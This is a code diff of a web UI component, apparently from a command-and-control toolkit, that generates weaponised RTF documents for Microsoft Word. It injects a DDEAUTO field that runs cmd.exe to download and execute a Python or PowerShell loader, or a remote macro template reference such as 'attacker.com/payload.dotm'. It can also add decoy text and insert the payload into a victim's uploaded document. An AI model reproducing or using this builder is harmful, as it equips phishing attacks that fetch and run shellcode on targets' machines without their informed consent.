@@ -4,48 +4,50 @@
 <div class="tool-panel">
     <div class="tool-header">
         <h3 class="tool-title">RTF Generator</h3>
-        <p class="tool-subtitle">Generate RTF documents that execute a loader via DDE — no macros or templates needed.</p>
+        <p class="tool-subtitle">Generate RTF documents with DDE execution or remote template injection.</p>
     </div>
 
     <div class="loader-content">
         <div class="loader-section">
-            <h4 class="loader-section-title">Overview</h4>
-            <p class="loader-text">
-                Generates an RTF document with a DDE (Dynamic Data Exchange) field that runs a loader
-                one-liner when the document is opened in Microsoft Word. No VBA macros, no remote templates
-                — the RTF itself triggers the command. The user sees a single "Update links?" prompt.
-            </p>
-        </div>
-
-        <div class="loader-section">
-            <h4 class="loader-section-title">1 — Loader</h4>
+            <h4 class="loader-section-title">1 — Technique</h4>
             <div class="loader-tabs">
-                <button class="loader-tab @(_loaderType == LoaderType.Python ? "loader-tab--active" : "")"
-                        @onclick="() => SetLoaderType(LoaderType.Python)">
-                    <C2Icon Name="code" Size="Size.Xs" /> Python
+                <button class="loader-tab @(_technique == Technique.TemplateInjection ? "loader-tab--active" : "")"
+                        @onclick="() => SetTechnique(Technique.TemplateInjection)">
+                    <C2Icon Name="link" Size="Size.Xs" /> Template Injection
                 </button>
-                <button class="loader-tab @(_loaderType == LoaderType.PowerShell ? "loader-tab--active" : "")"
-                        @onclick="() => SetLoaderType(LoaderType.PowerShell)">
-                    <C2Icon Name="terminal" Size="Size.Xs" /> PowerShell
+                <button class="loader-tab @(_technique == Technique.Dde ? "loader-tab--active" : "")"
+                        @onclick="() => SetTechnique(Technique.Dde)">
+                    <C2Icon Name="zap" Size="Size.Xs" /> DDE
                 </button>
             </div>
-            <p class="loader-text loader-hint">
-                @if (_loaderType == LoaderType.Python)
-                {
-                    <span>URL of the Python loader script. DDE runs <code>irm URL | python3</code>.</span>
-                }
-                else
-                {
-                    <span>URL of the PowerShell loader script. DDE runs <code>irm URL | powershell -Command -</code>.</span>
-                }
-            </p>
-            <C2InputActions Value="@_loaderUrl" ValueChanged="OnLoaderUrlChanged" Monospace BindOnInput
-                            Placeholder="@(_loaderType == LoaderType.Python ? "https://raw.githubusercontent.com/.../loader.py" : "https://raw.githubusercontent.com/.../loader.ps1")" />
-            <label class="loader-toggle">
-                <input type="checkbox" checked="@_hidden" @onchange="OnHiddenChanged" />
-                <span class="loader-toggle-label">Hidden window</span>
-                <span class="loader-text loader-hint">@(_hidden ? "PowerShell runs hidden — no window appears" : "PowerShell window is visible")</span>
-            </label>
+
+            @if (_technique == Technique.TemplateInjection)
+            {
+                <p class="loader-text loader-hint">
+                    URL of a remote Word template (.dotm) containing macros. Word fetches the template on open
+                    and prompts "Enable Content" — on accept, the macro runs.
+                </p>
+                <C2InputActions Value="@_templateUrl" ValueChanged="OnTemplateUrlChanged" Monospace BindOnInput
+                                Placeholder="https://attacker.com/payload.dotm" />
+            }
+            else
+            {
+                <p class="loader-text loader-hint" style="color:var(--text-muted);font-style:italic">
+                    DDE is blocked by KB5079473 (March 2026). Use Template Injection instead.
+                </p>
+                <div class="loader-tabs">
+                    <button class="loader-tab @(_loaderType == LoaderType.Python ? "loader-tab--active" : "")"
+                            @onclick="() => SetLoaderType(LoaderType.Python)">
+                        <C2Icon Name="code" Size="Size.Xs" /> Python
+                    </button>
+                    <button class="loader-tab @(_loaderType == LoaderType.PowerShell ? "loader-tab--active" : "")"
+                            @onclick="() => SetLoaderType(LoaderType.PowerShell)">
+                        <C2Icon Name="terminal" Size="Size.Xs" /> PowerShell
+                    </button>
+                </div>
+                <C2InputActions Value="@_loaderUrl" ValueChanged="OnLoaderUrlChanged" Monospace BindOnInput
+                                Placeholder="@(_loaderType == LoaderType.Python ? "https://raw.githubusercontent.com/.../loader.py" : "https://raw.githubusercontent.com/.../loader.ps1")" />
+            }
         </div>
 
         <div class="loader-section">
@@ -65,7 +67,7 @@
             {
                 <div class="loader-tab-body">
                     <p class="loader-text loader-hint">
-                        Decoy text shown after the DDE field executes. This is what the target sees in the document.
+                        Decoy text shown in the document. This is what the target sees.
                     </p>
                     <C2Input Value="@_docTitle" ValueChanged="v => { _docTitle = v; Rebuild(); }" BindOnInput
                              Placeholder="Document title" CssClass="loader-input-spacing" />
@@ -89,7 +91,7 @@
             {
                 <div class="loader-tab-body">
                     <p class="loader-text loader-hint">
-                        Upload your own RTF document. The DDE field will be injected after the header, preserving your formatting and content.
+                        Upload your own RTF document. The @(_technique == Technique.TemplateInjection ? "template reference" : "DDE field") will be injected into the header, preserving your formatting and content.
                     </p>
                     <div class="loader-actions">
                         <label class="loader-link-btn" style="cursor:pointer">
@@ -121,13 +123,26 @@
 
         <div class="loader-section">
             <h4 class="loader-section-title">How It Works</h4>
-            <p class="loader-text">
-                1. Target opens the RTF in Microsoft Word<br/>
-                2. Word prompts "This document contains links … Do you want to update?"<br/>
-                3. On accept, the DDE field executes the loader one-liner via PowerShell<br/>
-                4. The loader downloads the agent shellcode and runs it in memory<br/>
-                5. The document displays the decoy content
-            </p>
+            @if (_technique == Technique.TemplateInjection)
+            {
+                <p class="loader-text">
+                    1. Target opens the RTF in Microsoft Word<br/>
+                    2. Word fetches the remote .dotm template from the URL<br/>
+                    3. Word prompts "Enable Content" for macros<br/>
+                    4. On accept, the macro in the template executes the loader<br/>
+                    5. The document displays the decoy content
+                </p>
+            }
+            else
+            {
+                <p class="loader-text">
+                    1. Target opens the RTF in Microsoft Word<br/>
+                    2. Word prompts "This document contains links … Do you want to update?"<br/>
+                    3. On accept, the DDE field executes the loader one-liner via cmd.exe<br/>
+                    4. The loader downloads the agent shellcode and runs it in memory<br/>
+                    5. The document displays the decoy content
+                </p>
+            }
         </div>
     </div>
 </div>
@@ -135,21 +150,32 @@
 @code {
     private enum Mode { Generate, Upload }
     private enum LoaderType { Python, PowerShell }
+    private enum Technique { Dde, TemplateInjection }
 
+    private Technique _technique = Technique.TemplateInjection;
     private Mode _mode = Mode.Generate;
     private LoaderType _loaderType = LoaderType.Python;
     private bool _hidden = true;
     private string _loaderUrl = "";
+    private string _templateUrl = "";
     private string _docTitle = "";
     private string _docBody = "";
     private string _rtfContent = "";
     private string _customFileName = "";
     private string _customRtfContent = "";
+    private string _customRtfOriginal = "";
 
     protected override void OnInitialized()
     {
         _loaderUrl = Loaders.PythonLoaderUrl;
         Rebuild();
+    }
+
+    private void SetTechnique(Technique t)
+    {
+        _technique = t;
+        Rebuild();
+        RebuildCustom();
     }
 
     private void SetMode(Mode mode)
@@ -162,32 +188,115 @@
         _loaderType = type;
         _loaderUrl = type == LoaderType.Python ? Loaders.PythonLoaderUrl : Loaders.PowerShellLoaderUrl;
         Rebuild();
-        if (!string.IsNullOrEmpty(_customRtfOriginal))
-            _customRtfContent = InjectDde(_customRtfOriginal, _loaderUrl, _hidden, _loaderType);
+        RebuildCustom();
     }
 
     private void OnLoaderUrlChanged(string v)
     {
         _loaderUrl = v;
         Rebuild();
-        if (!string.IsNullOrEmpty(_customRtfOriginal))
-            _customRtfContent = InjectDde(_customRtfOriginal, _loaderUrl, _hidden, _loaderType);
+        RebuildCustom();
+    }
+
+    private void OnTemplateUrlChanged(string v)
+    {
+        _templateUrl = v;
+        Rebuild();
+        RebuildCustom();
     }
 
     private void OnHiddenChanged(ChangeEventArgs e)
     {
         _hidden = e.Value is true;
         Rebuild();
-        if (!string.IsNullOrEmpty(_customRtfOriginal))
-            _customRtfContent = InjectDde(_customRtfOriginal, _loaderUrl, _hidden, _loaderType);
+        RebuildCustom();
     }
 
     private void Rebuild()
     {
-        _rtfContent = GenerateRtf(_loaderUrl, _docTitle, _docBody, _hidden, _loaderType);
+        _rtfContent = _technique == Technique.TemplateInjection
+            ? GenerateTemplateRtf(_templateUrl, _docTitle, _docBody)
+            : GenerateDdeRtf(_loaderUrl, _docTitle, _docBody, _loaderType);
     }
 
-    private static string BuildDdeField(string loaderUrl, bool hidden, LoaderType loaderType)
+    private void RebuildCustom()
+    {
+        if (string.IsNullOrEmpty(_customRtfOriginal)) return;
+        _customRtfContent = _technique == Technique.TemplateInjection
+            ? InjectTemplate(_customRtfOriginal, _templateUrl)
+            : InjectDde(_customRtfOriginal, _loaderUrl, _loaderType);
+    }
+
+    // ── Template Injection ──────────────────────────────────────────────
+
+    private static string GenerateTemplateRtf(string templateUrl, string title, string body)
+    {
+        var titleRtf = string.IsNullOrWhiteSpace(title)
+            ? ""
+            : $"\\pard\\sa200\\sl276\\slmult1\\b\\fs28 {RtfEscape(title)}\\b0\\par\n";
+        var bodyRtf = string.IsNullOrWhiteSpace(body)
+            ? ""
+            : $"\\pard\\sa200\\sl276\\slmult1\\fs22 {RtfEscape(body)}\\par\n";
+
+        return @"{\rtf1\ansi\ansicpg1252\deff0" + "\n"
+             + @"{\fonttbl{\f0\fswiss\fcharset0 Calibri;}}" + "\n"
+             + @"{\colortbl;\red0\green0\blue0;}" + "\n"
+             + @"{\*\template " + RtfEscape(templateUrl) + "}" + "\n"
+             + @"\viewkind4\uc1\pard\lang1033\f0\fs22" + "\n"
+             + titleRtf
+             + bodyRtf
+             + "}";
+    }
+
+    private static string InjectTemplate(string rtfContent, string templateUrl)
+    {
+        var templateTag = @"{\*\template " + RtfEscape(templateUrl) + "}\n";
+
+        // Insert after \colortbl group, or after \fonttbl, or before first \pard
+        var insertAfter = FindHeaderInsertPoint(rtfContent);
+        if (insertAfter >= 0)
+            return rtfContent[..(insertAfter + 1)] + "\n" + templateTag + rtfContent[(insertAfter + 1)..];
+
+        // Fallback: before closing brace
+        var lastBrace = rtfContent.LastIndexOf('}');
+        if (lastBrace >= 0)
+            return rtfContent[..lastBrace] + templateTag + rtfContent[lastBrace..];
+
+        return rtfContent;
+    }
+
+    private static int FindHeaderInsertPoint(string rtfContent)
+    {
+        // Prefer after \colortbl group
+        var colortblIdx = rtfContent.IndexOf("\\colortbl");
+        if (colortblIdx >= 0)
+        {
+            var closeBrace = rtfContent.IndexOf('}', colortblIdx);
+            if (closeBrace >= 0) return closeBrace;
+        }
+
+        // After \fonttbl group
+        var fonttblIdx = rtfContent.IndexOf("\\fonttbl");
+        if (fonttblIdx >= 0)
+        {
+            var depth = 0;
+            for (var i = fonttblIdx; i < rtfContent.Length; i++)
+            {
+                if (rtfContent[i] == '{') depth++;
+                else if (rtfContent[i] == '}') { depth--; if (depth < 0) return i; }
+            }
+        }
+
+        // Before first \pard
+        var pardIdx = rtfContent.IndexOf("\\pard");
+        if (pardIdx >= 0) return pardIdx - 1;
+
+        return -1;
+    }
+
+    // ── DDE ─────────────────────────────────────────────────────────────
+
+    private static string BuildDdeField(string loaderUrl, LoaderType loaderType)
     {
         var pipe = loaderType == LoaderType.Python
             ? "python3"
@@ -197,9 +306,9 @@
         return @"{\field{\*\fldinst {DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe ""/c " + RtfEscape(cmd) + @"""}}{" + @"\fldrslt }}";
     }
 
-    private static string GenerateRtf(string loaderUrl, string title, string body, bool hidden, LoaderType loaderType)
+    private static string GenerateDdeRtf(string loaderUrl, string title, string body, LoaderType loaderType)
     {
-        var ddeField = BuildDdeField(loaderUrl, hidden, loaderType);
+        var ddeField = BuildDdeField(loaderUrl, loaderType);
 
         var titleRtf = string.IsNullOrWhiteSpace(title)
             ? ""
@@ -217,6 +326,27 @@
              + bodyRtf
              + "}";
     }
+
+    private static string InjectDde(string rtfContent, string loaderUrl, LoaderType loaderType)
+    {
+        var ddeField = BuildDdeField(loaderUrl, loaderType) + "\n";
+
+        var pardIdx = rtfContent.IndexOf("\\pard");
+        if (pardIdx >= 0)
+        {
+            var insertIdx = rtfContent.IndexOf(' ', pardIdx);
+            if (insertIdx < 0) insertIdx = pardIdx + 5;
+            return rtfContent[..(insertIdx + 1)] + ddeField + rtfContent[(insertIdx + 1)..];
+        }
+
+        var lastBrace = rtfContent.LastIndexOf('}');
+        if (lastBrace >= 0)
+            return rtfContent[..lastBrace] + ddeField + rtfContent[lastBrace..];
+
+        return rtfContent;
+    }
+
+    // ── Shared ──────────────────────────────────────────────────────────
 
     private static string RtfEscape(string s)
     {
@@ -248,10 +378,6 @@
         ");
     }
 
-    // --- Upload custom RTF ---
-
-    private string _customRtfOriginal = "";
-
     private async Task OnCustomRtfUpload(InputFileChangeEventArgs e)
     {
         var file = e.File;
@@ -262,34 +388,16 @@
         using var reader = new System.IO.StreamReader(stream);
         _customRtfOriginal = await reader.ReadToEndAsync();
 
-        _customRtfContent = InjectDde(_customRtfOriginal, _loaderUrl, _hidden, _loaderType);
+        RebuildCustom();
         StateHasChanged();
-    }
-
-    private static string InjectDde(string rtfContent, string loaderUrl, bool visible, LoaderType loaderType)
-    {
-        var ddeField = BuildDdeField(loaderUrl, visible, loaderType) + "\n";
-
-        var pardIdx = rtfContent.IndexOf("\\pard");
-        if (pardIdx >= 0)
-        {
-            var insertIdx = rtfContent.IndexOf(' ', pardIdx);
-            if (insertIdx < 0) insertIdx = pardIdx + 5;
-            return rtfContent[..(insertIdx + 1)] + ddeField + rtfContent[(insertIdx + 1)..];
-        }
-
-        var lastBrace = rtfContent.LastIndexOf('}');
-        if (lastBrace >= 0)
-            return rtfContent[..lastBrace] + ddeField + rtfContent[lastBrace..];
-
-        return rtfContent;
     }
 
     private async Task DownloadCustomRtf()
     {
         var bytes = System.Text.Encoding.ASCII.GetBytes(_customRtfContent);
         var base64 = Convert.ToBase64String(bytes);
-        var fileName = System.IO.Path.GetFileNameWithoutExtension(_customFileName) + "_dde.rtf";
+        var suffix = _technique == Technique.TemplateInjection ? "_template" : "_dde";
+        var fileName = System.IO.Path.GetFileNameWithoutExtension(_customFileName) + suffix + ".rtf";
         await JS.InvokeVoidAsync("eval", $@"
             (function() {{
                 var a = document.createElement('a');
